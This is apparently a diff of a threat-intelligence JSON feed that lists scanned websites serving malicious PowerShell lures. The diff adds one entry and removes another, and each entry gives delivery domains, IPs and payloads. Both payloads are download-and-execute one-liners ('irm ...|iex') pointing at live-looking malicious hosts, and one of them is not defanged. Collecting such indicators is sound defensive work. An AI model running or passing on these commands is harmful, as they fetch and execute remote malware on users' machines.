@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "stratasia.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/click/8d6a62fbc425bc67"
+    ],
+    "IP": [
+      "198.54.114.225"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/click/8d6a62fbc425bc67')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/click/8d6a62fbc425bc67"
+    ],
+    "ReportId": "cmwvnxzc10fac0nmlrhg9rp82",
+    "ScannedAt": "2026-11-25T05:08:32.722000+00:00"
+  },
+  {
     "UrlDomain": "georgeweissmd.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -13299,27 +13318,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmwhfjvpu0squ0oml2nvcen03",
     "ScannedAt": "2026-11-15T06:04:51.287000+00:00"
-  },
-  {
-    "UrlDomain": "peaceandh.net",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.53.85"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/2e1afda887033c57",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/2e1afda887033c57'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/2e1afda887033c57"
-    ],
-    "ReportId": "cmwhdrkmr0skk0omlnjzy4s28",
-    "ScannedAt": "2026-11-15T05:14:51.096000+00:00"
   }
 ]
